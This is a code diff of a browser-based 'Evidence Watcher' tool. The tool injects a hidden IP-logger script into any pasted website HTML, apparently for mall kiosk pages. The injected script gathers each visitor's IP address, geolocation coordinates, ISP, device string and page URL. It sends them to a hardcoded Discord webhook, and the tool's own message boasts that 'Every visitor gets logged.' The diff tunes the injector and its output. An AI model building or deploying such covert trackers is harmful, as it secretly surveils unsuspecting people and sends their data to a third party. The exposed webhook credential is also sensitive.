@@ -91,6 +91,9 @@
             resize: vertical;
             outline: none;
         }
+        #outputHtml {
+            background: #0a0c1f;
+        }
         .status {
             margin-top: 15px;
             padding: 10px;
@@ -139,13 +142,7 @@
     <div class="editor-area">
         <div class="panel">
             <div class="panel-header">📥 INPUT: YOUR WEBSITE HTML SOURCE</div>
-            <textarea id="inputHtml" placeholder='Paste your full HTML code here...
-
-Example:
-&lt;html&gt;
-&lt;head&gt;&lt;title&gt;Mall Kiosk&lt;/title&gt;&lt;/head&gt;
-&lt;body&gt;&lt;h1&gt;Welcome&lt;/h1&gt;&lt;/body&gt;
-&lt;/html&gt;'></textarea>
+            <textarea id="inputHtml" placeholder='Paste your full HTML code here...'></textarea>
         </div>
         <div class="panel">
             <div class="panel-header">📤 OUTPUT: TRACKED VERSION (COPY THIS)</div>
@@ -164,9 +161,8 @@ Example:
 <script>
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1499088458407219200/2K55GD94Hb9UDxfsBk-ZVF__9z-Bc2Qv1dg-H94f89pRoU5jq4jNpyyPQ5s7D1z5vyds';
 
-    // RAW INJECTION SCRIPT - NO BULLSHIT
+    // RAW INJECTION SCRIPT
     function getTrackerScript(label) {
-        // Escape label properly
         const cleanLabel = label.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$').replace(/"/g, '\\"');
         
         return `\n<!-- IP LOGGER INJECTED BY EVIDENCE WATCHER -->\n<script>
@@ -204,11 +200,11 @@ Example:
                 color: 0xff4444,
                 fields: [
                     {name: "🌐 IP", value: payload.ip, inline: true},
-                    {name: "📍 Location", value: \`\${payload.city}, \${payload.region}\n\${payload.country}\`, inline: true},
+                    {name: "📍 Location", value: \`\${payload.city}, \${payload.region}\\n\${payload.country}\`, inline: true},
                     {name: "🗺️ Coords", value: \`\${payload.lat}, \${payload.lon}\`, inline: true},
                     {name: "🏢 ISP", value: payload.isp, inline: true},
                     {name: "📱 Device", value: payload.ua.substring(0, 80), inline: false},
-                    {name: "🔗 Page", value: payload.url, inline: false},
+                    {name: "🔗 Page", value: payload.url.substring(0, 100), inline: false},
                     {name: "🏷️ Kiosk", value: payload.label, inline: true},
                     {name: "⏱️ Time", value: payload.timestamp, inline: true}
                 ]
@@ -218,16 +214,17 @@ Example:
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({embeds: [embed], username: "EvidenceWatcher"})
             });
-        } catch(e) { console.error("Tracker err", e); }
+            console.log("EvidenceWatcher: Data sent for", KIOSK_LABEL);
+        } catch(e) { console.error("EvidenceWatcher error:", e); }
     }
     getData();
 })();\n</script>\n<!-- END INJECTED TRACKER -->\n`;
     }
 
-    // RAW INJECTOR - finds </body> or </html> and slams it in
+    // FIXED INJECTOR - Using indexOf for exact matching
     function injectScript(html, label) {
         if (!html || html.trim() === "") {
-            throw new Error("Paste some HTML first, dumbass.");
+            throw new Error("Paste some HTML first.");
         }
         if (!label || label.trim() === "") {
             throw new Error("Enter a label so you know which kiosk is sending data.");
@@ -235,16 +232,16 @@ Example:
         
         const scriptBlock = getTrackerScript(label.trim());
         
-        // Try to inject before </body> (most common)
-        if (html.toLowerCase().includes('</body>')) {
-            return html.replace(/<\/body>/i, scriptBlock + '</body>');
+        // Try to find closing body tag (case sensitive search on original string)
+        if (html.indexOf('</body>') > -1) {
+            return html.replace('</body>', scriptBlock + '\n</body>');
         }
-        // Fallback to before </html>
-        if (html.toLowerCase().includes('</html>')) {
-            return html.replace(/<\/html>/i, scriptBlock + '</html>');
+        // Try to find closing html tag
+        if (html.indexOf('</html>') > -1) {
+            return html.replace('</html>', scriptBlock + '\n</html>');
         }
-        // Last resort: just append
-        return html + scriptBlock;
+        // If no closing tags found, just append
+        return html + '\n' + scriptBlock;
     }
 
     // DOM elements
@@ -254,6 +251,17 @@ Example:
     const injectBtn = document.getElementById('injectBtn');
     const copyBtn = document.getElementById('copyBtn');
     const statusDiv = document.getElementById('statusMsg');
+
+    // Set example HTML
+    inputArea.value = `<html>
+<head>
+    <title>Mall Directory Kiosk</title>
+</head>
+<body>
+    <h1>Welcome to Grand Mall</h1>
+    <p>Find your way around</p>
+</body>
+</html>`;
 
     // Inject button
     injectBtn.addEventListener('click', () => {
@@ -265,16 +273,24 @@ Example:
             outputArea.value = result;
             statusDiv.className = 'status success';
             statusDiv.textContent = '✅ INJECTED! Copy the output HTML and deploy it. Every visitor gets logged.';
-            setTimeout(() => {
-                if (statusDiv.className === 'status success') statusDiv.style.display = 'none';
-            }, 3000);
             statusDiv.style.display = 'block';
+            
+            // Verify injection worked
+            if (result.indexOf('IP LOGGER INJECTED') > -1) {
+                console.log("Injection confirmed - script tag added");
+            } else {
+                console.warn("Injection may have failed - script not found in output");
+            }
+            
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+            }, 3000);
         } catch (err) {
             statusDiv.className = 'status error';
             statusDiv.textContent = '❌ ' + err.message;
             statusDiv.style.display = 'block';
             setTimeout(() => {
-                if (statusDiv.className === 'status error') statusDiv.style.display = 'none';
+                statusDiv.style.display = 'none';
             }, 3000);
         }
     });
@@ -296,22 +312,15 @@ Example:
             statusDiv.style.display = 'block';
             setTimeout(() => statusDiv.style.display = 'none', 2000);
         } catch (err) {
-            statusDiv.className = 'status error';
-            statusDiv.textContent = '❌ Copy failed, select manually.';
+            // Fallback for old browsers
+            outputArea.select();
+            document.execCommand('copy');
+            statusDiv.className = 'status success';
+            statusDiv.textContent = '📋 COPIED (manual method)!';
             statusDiv.style.display = 'block';
+            setTimeout(() => statusDiv.style.display = 'none', 2000);
         }
     });
-
-    // Optional example placeholder
-    inputArea.placeholder = `<html>
-<head>
-    <title>Mall Directory Kiosk</title>
-</head>
-<body>
-    <h1>Welcome to Grand Mall</h1>
-    <p>Find your way around</p>
-</body>
-</html>`;
 </script>
 </body>
 </html>
